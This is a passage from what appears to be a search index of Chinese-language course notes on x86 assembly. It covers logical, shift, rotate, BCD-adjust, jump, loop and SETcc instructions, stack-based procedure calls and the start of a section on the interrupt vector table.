<li>\u6307\u4ee4\u6548\u679c\uff1a dest = dest &amp; src</li> </ul> <p>OR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a or dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest = dest | src</li> </ul> <p>XOR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a xor dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest = dest ^ src</li> </ul> <p>NOT</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a not op</li> <li>\u6307\u4ee4\u6548\u679c\uff1a op = ^op</li> <li>\u6ce8\u610f\uff1a \u6240\u6709\u903b\u8f91\u8fd0\u7b97\u4e2d\uff0c\u53ea\u6709 NOT \u4e0d\u5f71\u54cd\u4efb\u4f55\u72b6\u6001\u6807\u5fd7</li> </ul> <p>TEST</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a test dest, op</li> <li>\u6307\u4ee4\u6548\u679c\uff1a test dest &amp; src</li> <li>\u6ce8\u610f\uff1a test \u6307\u4ee4\u5e76\u4e0d\u4fdd\u5b58\u7ed3\u679c\u503c\uff0c\u4f46\u4f1a\u50cf and dest, src \u4e00\u6837\u5f71\u54cd\u72b6\u6001\u6807\u5fd7</li> </ul> <p>80386 - Pentium 4 \u6709\u56db\u79cd\u6d4b\u8bd5\u5355\u4e2a\u6bd4\u7279\u7684 test \u6307\u4ee4</p> <p></p> <ul> <li><code>BT AX, 4</code> \u6d4b\u8bd5 AX \u7684\u7b2c\u56db\u4f4d\uff0cCF = AX[4]</li> <li><code>BTS CX, 9</code> \u8bbe\u7f6e CX[9] = 1</li> <li><code>BTR CX, 9</code> \u8bbe\u7f6e CX[9] = 0</li> <li><code>BTC CX, 9</code> \u8bbe\u7f6e CX[9] = ~CX[9]</li> </ul>"},{"location":"Courses/asm/ch5/#_8","title":"\u79fb\u4f4d\u6307\u4ee4","text":"<p>SHL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a shl dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest &lt;&lt;= count &amp; 1Fh</li> <li>\u6ce8\u610f\uff1a \u53f3\u4fa7\u88650\uff0c\u5de6\u4fa7\u6ea2\u51fa\u4f4d\u843d\u5165 CF\uff1bcount \u53ea\u80fd\u662f idata \u6216 cl<ul> <li>\u82e5\u4e3a .386\uff0c\u5219 idata \u53ef\u4e3a\u4efb\u610f\u5927\u5c0f\u7684 8 \u4f4d\u5e38\u6570</li> <li>\u82e5\u4e3a 8086\uff0c\u5219 idata \u53ea\u80fd\u4e3a 1</li> <li>\u5176\u5b83\u79fb\u4f4d\u6307\u4ee4\u548c shl \u6307\u4ee4\u89c4\u5b9a\u76f8\u540c\uff0c\u4e0d\u518d\u505a\u9610\u8ff0</li> </ul> </li> </ul> <p>SHR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a shr dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest &gt;&gt;= count &amp; 1Fh</li> <li>\u6ce8\u610f\uff1a \u5de6\u4fa7\u88650\uff0c\u53f3\u4fa7\u6ea2\u51fa\u4f4d\u843d\u5165 CF\uff1bcount \u53ea\u80fd\u662f idata \u6216 cl</li> </ul> <p>SAL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a sal dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest &lt;&lt;= count &amp; 1Fh</li> <li>\u6ce8\u610f\uff1a \u7b97\u672f\u5de6\u79fb\u6307\u4ee4\uff0c\u4e0e SHL \u5b8c\u5168\u76f8\u540c</li> </ul> <p>SAR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a sar dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest &gt;&gt;= count &amp; 1Fh</li> <li>\u6ce8\u610f\uff1a \u5de6\u4fa7\u4e0d\u53d8\uff0c\u53f3\u4fa7\u6ea2\u51fa\u4f4d\u843d\u5165 CF\uff1bcount \u53ea\u80fd\u662f idata \u6216 cl<ul> <li>\u4f7f\u7528\u7b97\u672f\u53f3\u79fb\u505a\u9664\u6cd5\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u4e0e IDIV \u5e76\u4e0d\u4e00\u81f4\uff0cIDIV \u5c06\u7ed3\u679c\u5411 0 \u53d6\u6574\uff0cSAR \u5c06\u7ed3\u679c\u5411 -inf \u53d6\u6574</li> </ul> </li> </ul> \u901a\u8fc7\u5bf9\u88ab\u9664\u6570\u8fdb\u884c\u8865\u507f\uff0c\u8fbe\u5230 SAR \u548c IDIV \u7b49\u4ef7\u7684\u6548\u679c\uff0c\u5177\u4f53\u662f\u5982\u679c\u88ab\u9664\u6570\u4e3a\u8d1f\u5219\u52a0\u4e0a \\(2^k-1\\) C functionassembly <pre><code>int idiv(int x) { return x/8; }\n</code></pre> <pre><code>; x86-64 clang 13.0.0 -O3\nlea eax, [rdi+7]  ; eax = rdi + 7\ntest edi, edi     ; if edi &gt;= 0\ncmovns eax, edi   ;   eax = edi\nsar eax, 3        ; return eax &gt;&gt; 3\n; \u5b9e\u9645\u4e0a\u8fd9\u4e00\u5957\u64cd\u4f5c\u6bd4\u76f4\u63a5 idiv \u7684\u8fd0\u884c\u901f\u5ea6\u66f4\u5feb\n</code></pre> <p>ROL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rol dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5bf9\u00a0dest\u00a0\u5faa\u73af\u5de6\u79fb\u00a0count\u00a0&amp; 1Fh \u4f4d\uff0c\u6700\u9ad8\u4f4d\u56de\u5230\u6700\u4f4e\u4f4d\u540c\u65f6\u79fb\u5230\u00a0CF\u00a0\u4e2d</li> <li>\u6ce8\u610f\uff1a rotate left\uff1bcount \u53ea\u80fd\u662f idata \u6216 cl</li> </ul> <p>ROR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a ror dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5bf9\u00a0dest\u00a0\u5faa\u73af\u53f3\u79fb\u00a0count &amp; 1Fh\u00a0\u4f4d\uff0c\u6700\u4f4e\u4f4d\u56de\u5230\u6700\u9ad8\u4f4d\u540c\u65f6\u79fb\u5230\u00a0CF\u00a0\u4e2d</li> <li>\u6ce8\u610f\uff1a rotate right\uff1bcount \u53ea\u80fd\u662f idata \u6216 cl</li> </ul> <p>RCL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rcl dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5e26\u8fdb\u4f4d\u5faa\u73af\u5de6\u79fb\uff0c\u5373\u00a0CF\u00a0\u52a0\u5728\u00a0dest\u00a0\u5de6\u4fa7\u4e00\u8d77\u5faa\u73af\u5de6\u79fb</li> <li>\u6ce8\u610f\uff1a count \u53ea\u80fd\u662f idata \u6216 cl</li> </ul> <p>RCR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rcr dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5e26\u8fdb\u4f4d\u5faa\u73af\u53f3\u79fb\uff0c\u5373\u00a0CF\u00a0\u52a0\u5728\u00a0dest\u00a0\u53f3\u4fa7\u4e00\u8d77\u5faa\u73af\u53f3\u79fb</li> <li>\u6ce8\u610f\uff1a count \u53ea\u80fd\u662f idata \u6216 cl</li> </ul> <p>\u8bd5\u5199\u51fa\u628a32\u4f4d\u6570 3F7E59ACh \u903b\u8f91\u5de6\u79fb2\u4f4d\u7684\u6c47\u7f16\u6307\u4ee4\u5e8f\u5217\uff0c\u8981\u6c42\u7ed3\u679c\u5b58\u653e\u5728DX:AX\u4e2d</p> <pre><code>    mov ax, 59ACh\n    mov dx, 3F7Eh\n    mov cx, 2\nagain:\n    shl ax, 1\n    rcl dx, 1\n    loop again\n</code></pre>"},{"location":"Courses/asm/ch5/#_9","title":"\u5341\u8fdb\u5236\u8c03\u6574\u6307\u4ee4","text":"<p>Binary Coded Decimal \u662f\u6307\u7528\u4e8c\u8fdb\u5236\u7f16\u7801\u7684\u5341\u8fdb\u5236\u6570\u3002</p> <ul> <li>\u538b\u7f29BCD\u7801 \u4ee54\u4f4d\u4e8c\u8fdb\u5236\u8868\u793a1\u4f4d\u5341\u8fdb\u5236<ul> <li>\\(37_{Decimal}\\Rightarrow 37h\\)</li> </ul> </li> <li>\u975e\u538b\u7f29BCD\u7801 \u4ee58\u4f4d\u4e8c\u8fdb\u5236\u8868\u793a1\u4f4d\u5341\u8fdb\u5236<ul> <li>\\(37_{Decimal}\\Rightarrow 0307h\\)</li> <li>\u9ad8\u4f4d\u6ca1\u6709\u610f\u4e49\uff0c\u53ef\u4ee5\u4e3a\u4efb\u610f\u503c\uff0c\u5982 <code>06h</code>,<code>36h</code> \u90fd\u8868\u793a\u5341\u8fdb\u5236\u6570 6</li> </ul> </li> </ul> <p># \u538b\u7f29BCD\u7801\u8c03\u6574\u6307\u4ee4</p> <p>DAA</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a daa</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u538b\u7f29BCD\u7801\u52a0\u6cd5\u7684\u5341\u8fdb\u5236\u8c03\u6574\uff0c\u5c06AL\u8c03\u6574\u56deBCD\u7801<ul> <li>if (af == 1 || (al&amp;0Fh) &gt; 9) al += 6, af = 1; else af = 0</li> <li>if (cf == 1 || al &gt; 9Fh) al += 60h, cf = 1; else cf = 0</li> </ul> </li> </ul> <p>DAS</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a das</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u538b\u7f29BCD\u7801\u51cf\u6cd5\u7684\u5341\u8fdb\u5236\u8c03\u6574\uff0c\u5c06AL\u8c03\u6574\u56deBCD\u7801<ul> <li>if (af == 1 || (al&amp;0Fh) &gt; 9) al -= 6, af = 1; else af = 0</li> <li>if (cf == 1 || al &gt; 9Fh) al -= 60h, cf = 1; else cf = 0</li> </ul> </li> </ul> <p># \u975e\u538b\u7f29BCD\u7801\u8c03\u6574\u6307\u4ee4</p> <p>AAA</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a aaa</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u52a0\u6cd5\u7684\u00a0ASCII\u00a0\u8c03\u6574\uff0c\u5728\u00a0al\u00a0\u88ab\u505a\u52a0\u6cd5\u540e\u8c03\u6574\u00a0ax\u00a0\u4e3a\u975e\u538b\u7f29BCD\u7801(ah\u4e5f\u88ab\u4fee\u6539)<ul> <li>if (af == 1 || (al&amp;0Fh) &gt; 9) al = (al+6)&amp;0Fh, ah += 1, af = 1, cf = 1</li> <li>else af = 0, cf = 0</li> </ul> </li> </ul> <p>AAS</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a aas</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u51cf\u6cd5\u7684\u00a0ASCII\u00a0\u8c03\u6574\uff0c\u5728\u00a0al\u00a0\u88ab\u505a\u51cf\u6cd5\u540e\u8c03\u6574\u00a0ax\u00a0\u4e3a\u975e\u538b\u7f29BCD\u7801(ah\u4e5f\u88ab\u4fee\u6539)<ul> <li>if (af == 1 || (af&amp;0Fh) &gt; 9) al = (al-6)&amp;0Fh, ah -= 1, af = 1, cf = 1</li> <li>else af = 0, cf = 0</li> </ul> </li> </ul> <p>AAM</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a aam</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4e58\u6cd5\u7684\u00a0ASCII\u00a0\u8c03\u6574\uff0c\u5728\u00a0al\u00a0\u88ab\u505a\u4e58\u6cd5\u540e\u8c03\u6574\u00a0ax\u00a0\u4e3a\u975e\u538b\u7f29BCD\u7801(ah\u4e5f\u88ab\u4fee\u6539)<ul> <li>ah = al / 10, al = al % 10</li> </ul> </li> </ul> <p>AAD</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a aam</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u9664\u6cd5\u7684\u00a0ASCII\u00a0\u8c03\u6574\uff0c\u5728\u00a0al\u00a0\u88ab\u505a\u9664\u6cd5\u540e\u8c03\u6574\u00a0ax\u00a0\u4e3a\u975e\u538b\u7f29BCD\u7801(ah\u4e5f\u88ab\u4fee\u6539)<ul> <li>al = ah * 10 + al, ah = 0</li> </ul> </li> </ul>"},{"location":"Courses/asm/ch6/","title":"Program Control Instructions","text":""},{"location":"Courses/asm/ch6/#program-control-instructions","title":"Program Control Instructions","text":"<p> \u7ea6 1689 \u4e2a\u5b57  46 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p>"},{"location":"Courses/asm/ch6/#_1","title":"\u63a7\u5236\u8f6c\u79fb\u6307\u4ee4","text":"<p>\u6839\u636e\u8df3\u8f6c\u8ddd\u79bb\u7684\u8fdc\u8fd1\uff0c<code>jmp</code> \u5206\u4e3a\u4e09\u7c7b\uff1a</p> <ul> <li>\u77ed\u8df3(short jump) \uff1a\u8df3\u8f6c\u8ddd\u79bb\u7528\u4e00\u4e2a\u5b57\u8282\u8868\u793a\uff0c\u673a\u5668\u7801\u4ee5 <code>EB</code> \u5f00\u5934<ul> <li>\u77ed\u8df3\u540e\u9762\u53ea\u80fd\u63a5\u76ee\u6807\u504f\u79fb\u5730\u5740\u6216\u6807\u53f7\uff1b\u800c\u8fd1\u8df3\u8fd8\u53ef\u4ee5\u63a5 16 \u4f4d\u5bc4\u5b58\u5668\u6216 16 \u4f4d\u53d8\u91cf</li> <li>\u77ed\u8df3\u673a\u5668\u7801\u7684 idata \u4e3a\u4e00\u4e2a\u5b57\u8282\uff0c\u5bf9\u5e94\u5927\u5c0f\u4e3a\u76ee\u6807\u5730\u5740\u51cf\u53bb\u4e0b\u6761\u6307\u4ee4\u7684\u504f\u79fb\u5730\u5740($+2)</li> </ul> </li> <li>\u8fd1\u8df3(near jump) \uff1a\u8df3\u8f6c\u8ddd\u79bb\u6216\u76ee\u6807\u5730\u5740\u7528\u4e00\u4e2a\u5b57\u8868\u793a\uff0c\u673a\u5668\u7801\u4ee5 <code>E9</code> \u5f00\u5934<ul> <li>\u673a\u5668\u7801 <code>E9FD1E</code> \u5bf9\u5e94\u6307\u4ee4 <code>1D3E:0100: jmp 2000h</code> \u5373\u8df3\u8f6c\u5230\u5730\u5740 <code>1D3E:2000</code></li> <li>\u5176\u4e2d <code>FD1E</code> \u542b\u4e49\u4e3a <code>1EFD = 2000h - 0103h</code>\uff0c\u5373\u76ee\u6807\u5730\u5740\u51cf\u53bb\u4e0b\u6761\u6307\u4ee4\u7684\u504f\u79fb\u5730\u5740</li> <li>\u504f\u79fb\u5730\u5740\u5728\u673a\u5668\u7801\u4e2d\u4e5f\u662f\u5c0f\u7aef\u5b58\u50a8</li> </ul> </li> <li>\u8fdc\u8df3(far jump) \uff1a\u76ee\u6807\u5730\u5740\u7528\u4e00\u4e2a\u8fdc\u6307\u9488\u8868\u793a(\u6bb5\u5730\u5740\uff1a\u504f\u79fb\u5730\u5740)\uff0c\u673a\u5668\u7801\u4ee5 <code>EA</code> \u5f00\u5934<ul> <li>\u673a\u5668\u7801 <code>EA0000FFFF</code> \u5bf9\u5e94\u6307\u4ee4 <code>jmp 0FFFFh:0000h</code> \u3002\u4f46\u662f\u5b9e\u9645\u4e0a\u8fdc\u8df3\u4e0d\u80fd\u76f4\u63a5\u63a5\u5e38\u6570\u5730\u5740\uff0c\u4e0b\u9762\u4e24\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5b9e\u73b0\u76f8\u540c\u6548\u679c\uff1a</li> </ul> </li> </ul> <pre><code>data segment\naddr dw 0000h, 0FFFFh\ndata ends\n\ncode segment\nassume cs:code, ds:data\nmain:\n    mov ax, data\n    mov ds, ax\n\n    ; jmp 0FFFFh:0000h\n\n    ; jmp dword ptr 32\u4f4d\u53d8\u91cf\n    jmp dword ptr [addr]\n\n    ; \u673a\u5668\u7801\u65b9\u5f0f\n    db 0EAh\n    dw 0\n    dw 0FFFFh\n\n    ; \u5047\u5b9a extra \u6bb5\u5df2\u6b63\u786e\u5b9a\u4e49\n    mov word ptr es:[di], 0000h\n    mov word ptr es:[di+4], 0FFFFh\n    jmp dword ptr es:[di]\ncode ends\nend main\n</code></pre> <p>\u4e3b\u8981\u901a\u8fc7\u6307\u4ee4\u673a\u5668\u7801\u957f\u5ea6\u533a\u5206\u8fd9\u4e09\u4e2a\u8df3</p> <p>\u4e0d\u8fc7\u6211\u4eec\u7f16\u5199\u4ee3\u7801\u7684\u65f6\u5019\u76f4\u63a5\u4f7f\u7528 <code>jcc</code> \u6307\u4ee4\u5373\u53ef\uff0c\u533a\u5206\u7c7b\u578b\u7684\u4e8b\u4ea4\u7ed9\u673a\u5668\u3002</p> Jcc\u6307\u4ee4 \u542b\u4e49 \u8df3\u8f6c\u6761\u4ef6 \u89e3\u91ca jc \u6709\u8fdb\u4f4d\u5219\u8df3 <code>CF==1</code> Jump if carry \u6709\u8fdb\u4f4d\u6216\u501f\u4f4d jnc \u65e0\u8fdb\u4f4d\u5219\u8df3 <code>CF==0</code> Jump if no carry \u65e0\u8fdb\u4f4d\u6216\u501f\u4f4d jz \u4e3a\u96f6\u5219\u8df3 <code>ZF==1</code> Jump if zero \u8fd0\u7b97\u7ed3\u679c\u4e3a 0 jnz \u4e0d\u4e3a\u96f6\u5219\u8df3 <code>ZF==0</code> Jump if not zero \u8fd0\u7b97\u7ed3\u679c\u4e0d\u4e3a 0 js \u6709\u7b26\u53f7\u4f4d\u5219\u8df3 <code>SF==1</code> Jump if sign \u7b26\u53f7\u6570\u8fd0\u7b97\u7ed3\u679c\u4e3a\u8d1f jns \u65e0\u7b26\u53f7\u4f4d\u5219\u8df3 <code>SF==0</code> Jump if no sign \u7b26\u53f7\u6570\u8fd0\u7b97\u7ed3\u679c\u4e3a\u6b63 jo \u6709\u6ea2\u51fa\u5219\u8df3 <code>OF==1</code> Jump if overflow \u7b26\u53f7\u6570\u8fd0\u7b97\u7ed3\u679c\u6709\u9519 jno \u65e0\u6ea2\u51fa\u5219\u8df3 <code>OF==0</code> Jump if not overflow \u7b26\u53f7\u6570\u8fd0\u7b97\u7ed3\u679c\u6b63\u786e jp \u6709\u5947\u5076\u6821\u9a8c\u6807\u5fd7\u5219\u8df3 <code>PF==1</code> Jump if parity \u8fd0\u7b97\u7ed3\u679c\u4f4e\u516b\u4f4d1\u7684\u4e2a\u6570\u4e3a\u5076 jnp \u65e0\u5947\u5076\u6821\u9a8c\u6807\u5fd7\u5219\u8df3 <code>PF==0</code> Jump if no parity \u8fd0\u7b97\u7ed3\u679c\u4f4e\u516b\u4f4d1\u7684\u4e2a\u6570\u4e3a\u5947 jcxz CX\u4e3a\u96f6\u5219\u8df3 <code>CX==0</code> Jump if CX is zero CX\u7684\u503c\u4e3a 0 jecxz ECX\u4e3a\u96f6\u5219\u8df3 <code>ECX==0</code> Jump if ECX is zero ECX\u7684\u503c\u4e3a 0 ja \u65e0\u7b26\u53f7\u5927\u4e8e\u5219\u8df3 <code>CF==0 &amp; ZF==0</code> \u4e0e <code>jnbe</code> \u5b8c\u5168\u7b49\u4ef7 jae \u65e0\u7b26\u53f7\u5927\u4e8e\u7b49\u4e8e\u5219\u8df3 jb \u65e0\u7b26\u53f7\u5c0f\u4e8e\u5219\u8df3 \u4e0e <code>jc</code>, <code>jnae</code> \u5b8c\u5168\u7b49\u4ef7 jbe \u65e0\u7b26\u53f7\u5c0f\u4e8e\u7b49\u4e8e\u5219\u8df3 <p>LOOP</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a loop dest</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5faa\u73af\u8df3\u8f6c CX \u6b21<ul> <li>if(--CX != 0) IP = dest;</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u5148\u4f5c\u51cf\u6cd5\uff0c\u518d\u5224\u65ad\u662f\u5426\u4e3a0\uff0c\u56e0\u6b64\u5c06CX\u8d4b\u503c\u4e3a0\u53ef\u5faa\u73af\u7684\u6b21\u6570\u6700\u591a(1+FFFF)\uff1b\u5982\u679c\u4e0d\u5e0c\u671bCX\u4e3a0\u65f6\u8fdb\u5165\u5faa\u73af\uff0c\u5e94\u8be5\u5728\u8fdb\u5165\u5faa\u73af\u524d\u4f7f\u7528 <code>jcxz</code> \u6307\u4ee4\u8df3\u8f6c\u5230\u5faa\u73af\u51fa\u53e3</li> </ul> <p>LOOPZ</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a loopz dest</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u6700\u591a\u5faa\u73af CX \u6b21<ul> <li>if(ZF == 1 &amp;&amp; --CX != 0) IP = dest;</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d</li> </ul> <p>LOOPNZ</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a loopnz dest</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4e0d\u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u6700\u591a\u5faa\u73af CX \u6b21<ul> <li>if(ZF == 0 &amp;&amp; --CX != 0) IP = dest;</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d</li> </ul> <p>\u4e09\u79cd\u5faa\u73af\u7684\u6c47\u7f16</p> Do-WhileWhileFor <p></p> <p></p> <p></p>"},{"location":"Courses/asm/ch6/#_2","title":"\u6761\u4ef6\u8bbe\u7f6e\u6307\u4ee4","text":"<p>SETcc</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a setcc op</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5982\u679c flags \u4e2d\u5bf9\u5e94\u72b6\u6001\u4f4d\u6ee1\u8db3\u6761\u4ef6 <code>cc</code>\uff0c\u5219\u5c06 op \u7f6e 1\uff1b\u53cd\u4e4b\u7f6e 0<ul> <li>\u4f8b\u5982 setc eax \u5bf9 CF \u8fdb\u884c\u68c0\u6d4b\uff0c\u6548\u679c\u7b49\u4ef7 eax = CF</li> </ul> </li> </ul> <p>Conditional Set Instructions</p> <p></p>"},{"location":"Courses/asm/ch6/#_3","title":"\u8fc7\u7a0b\u8c03\u7528","text":"<p>\u901a\u8fc7\u5806\u6808\u4f20\u9012\u53c2\u6570\uff0c\u5728 <code>call</code> \u6307\u4ee4\u524d\u5c06\u53c2\u6570\u6309\u7167\u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u538b\u5165\u6808(\u5bf9\u5e94\u7684\u6808\u4ece\u4e0a\u5230\u4e0b)\uff0c\u7136\u540e\u5148\u5728\u51fd\u6570\u5f00\u5934\u6267\u884c <code>push bp</code>, <code>mov bp, sp</code> \u83b7\u53d6\u5f53\u524d\u72b6\u6001\u6808\u9876\u5730\u5740\u5b58\u5165 <code>bp</code> \u3002\u7531\u4e8e <code>call</code> \u6307\u4ee4\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u5c06\u8fd4\u56de\u5730\u5740\u4e5f\u538b\u5165\u5806\u6808\uff0c\u56e0\u6b64\u5b9e\u9645\u8c03\u7528\u53c2\u6570\u8981\u4ece <code>[bp+4]</code> \u5f00\u59cb(also <code>ss:[bp+4]</code>)\uff1a</p> <pre><code>code segment\nassume cs:code\nf:  ; f(int a, int b) return a+b\n    push bp\n    mov bp, sp\n    mov ax, [bp+4]  ; a\n    add ax, [bp+6]  ; b\n    pop bp          ; \u6062\u590d bp\n    ret     ; return \u6307\u4ee4\u540c\u6837\u4f1a pop \u6808\u627e\u51fa\u8fd4\u56de\u5730\u5740\n\nmain:\n    mov ax, 3\n    push ax\n    mov ax, 2\n    push ax\n    call f  ; call \u6307\u4ee4\u4f1a\u5c06\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u538b\u5165\u6808\nback:\n    add sp, 4  ; \u6e05\u7a7a\u6808\ncode ends\nend main\n</code></pre> Near CallFar Call <p></p> Note <p>Near Call \u524d\u540e\u6bb5\u5bc4\u5b58\u5668 CS \u5747\u4e3a 1000\uff0c\u56e0\u6b64 push \u7684\u8fd4\u56de\u5730\u5740\u53ea\u9700\u8981\u538b\u5165\u504f\u79fb 0003H\uff0c\u5373\u8fc7\u7a0b\u8c03\u7528\u8fd4\u56de\u4e3a 10003H </p> <p></p> Note <p>Far Call \u524d\u540e\u6bb5\u5bc4\u5b58\u5668 CS \u7684\u503c\u4ece 1000 \u53d8\u4e3a 1100\uff0c\u56e0\u6b64 push \u7684\u8fd4\u56de\u5730\u5740\u9700\u8981\u538b\u5165 CS \u548c IP \u4e24\u4e2a\uff0c\u8fc7\u7a0b\u8c03\u7528\u8fd4\u56de\u5730\u5740\u4e3a 1000:0005 = 10005H</p> <p>\u5982\u679c\u51fd\u6570\u6709\u8fd4\u56de\u503c\uff0c\u4e00\u822c\u6839\u636e\u4f4d\u6570\u4f7f\u7528 <code>al,ax,eax</code> \u6765\u5b58\u50a8\u8fd4\u56de\u503c\u3002</p> <p>How to return 64 bit?</p> <p>\u4f7f\u7528 <code>edx:eax</code> \u5206\u522b\u5b58\u50a8\u9ad8\u4f4d\u548c\u4f4e\u4f4d</p> <p>\u5728\u51fd\u6570\u8c03\u7528\u524d\u540e\uff0c\u4f9d\u7167\u4e0d\u540c\u7684\u89c4\u5219\u9700\u8981\u4fdd\u8bc1\u4e00\u4e9b\u5bc4\u5b58\u5668\u7684\u524d\u540e\u503c\u4e0d\u53d8\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5728\u51fd\u6570\u5f00\u5934\u548c\u7ed3\u5c3e\u4fdd\u5b58\u5b83\u4eec\u7684\u72b6\u6001\u5e76\u6062\u590d\u3002</p> <p>\u5bf9\u4e8e <code>CALL</code> \u548c <code>RET</code> \u6307\u4ee4\uff0c\u5b83\u4eec\u4e5f\u548c <code>JMP</code> \u4e00\u6837\u5177\u6709\u7edd\u5bf9\u504f\u79fb\u548c\u76f8\u5bf9\u504f\u79fb\u4e24\u79cd\u5f62\u5f0f\uff0c\u533a\u5206\u65b9\u5f0f\u4e3a\u7edd\u5bf9\u504f\u79fb\u4f7f\u7528\u5bc4\u5b58\u5668\u503c\u4f5c\u4e3a\u504f\u79fb\u91cf\uff0c\u4f7f\u7528\u6bb5\u5bc4\u5b58\u5668\u4f5c\u4e3a\u57fa\u51c6\u91cf\uff1b\u800c\u76f8\u5bf9\u504f\u79fb\u4f7f\u7528 Label \u4f5c\u4e3a\u504f\u79fb\u91cf\uff0cInstruction Pointer \u4f5c\u4e3a\u57fa\u51c6\u91cf\uff0c\u5728\u7f16\u8bd1\u65f6\u88ab\u66ff\u6362\u4e3a signed displacement\u3002</p> <p>\u6211\u4eec\u901a\u8fc7 <code>CALL</code> \u8fdb\u884c\u8fc7\u7a0b\u8c03\u7528\u65f6\u65e2\u53ef\u4ee5\u7528\u7edd\u5bf9\u504f\u79fb\uff0c\u53c8\u53ef\u4ee5\u7528\u76f8\u5bf9\u504f\u79fb\uff0c\u4f46\u662f\u901a\u8fc7 <code>RET</code> \u8fdb\u884c\u8fc7\u7a0b\u8fd4\u56de\u7684\u65f6\u5019\u53ea\u80fd\u4f7f\u7528\u7edd\u5bf9\u504f\u79fb\uff0c\u56e0\u4e3a\u4e00\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u88ab\u591a\u4e2a\u4e0d\u540c\u5730\u5740\u7684\u4ee3\u7801\u8c03\u7528\uff0c\u56e0\u6b64\u8fd4\u56de\u7684\u76ee\u7684\u5730\u5740\u4e0d\u662f\u56fa\u5b9a\u503c\u3002</p> <p>\u6709\u4e09\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5728 <code>CALL</code> \u4e2d\u53d8\u66f4\u7279\u6743\u9636\u7ea7\uff1a</p> <ul> <li>&lt;1&gt; defines conforming code segments to share libraries (e.g., math) for various privilege levels</li> <li>&lt;2&gt; through special segment descriptors called Gates</li> <li>&lt;3&gt; utilizes fast system call instructions<ul> <li>(<code>SYSCALL/SYSRET</code> or <code>SYSENTER /SYSEXIT</code>) to access ring 0 from ring 3</li> </ul> </li> </ul> <p>\u8de8\u6743\u9650\u7684 <code>CALL</code> \u4e00\u5b9a\u662f Far Call</p>"},{"location":"Courses/asm/ch6/#_4","title":"\u4e2d\u65ad\u4e0e\u5f02\u5e38","text":"<p>\u4e2d\u65ad\u7684\u8c03\u7528\u5176\u5b9e\u76f8\u5f53\u4e8e\u5185\u7f6e\u51fd\u6570\u7684\u8c03\u7528\uff0c\u4e2d\u65ad\u51fd\u6570\u7684\u5730\u5740\u5b58\u50a8\u4e2d\u65ad\u5411\u91cf\u8868\u4e2d\uff0c\u5728 8086 \u4e2d\u4f4d\u4e8e\u5185\u5b58 <code>0000:0000</code> \u540e\uff0c\u6bcf\u56db\u4e2a\u5b57\u8282\u8868\u793a\u4e00\u6761\u4e2d\u65ad\u6307\u4ee4\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u5982\u4e0b\u6240\u793a\u7684\u4e00\u6bb5\u5185\u5b58\uff1a</p> <pre><code>0000:0054:  40h\n0000:0055:  02h\n0000:0056:  58h\n0000:0057:  02h\n0000:0058:  2Dh   &lt;- int 16h \u4e2d\u65ad\u5411\u91cf\u8d77\u59cb\u5730\u5740\n0000:0059:  04h\n0000:005A:  70h\n0000:005B:  00h\n</code></pre> <p>\u5bf9\u4e8e\u6307\u4ee4 <code>int 16h</code> 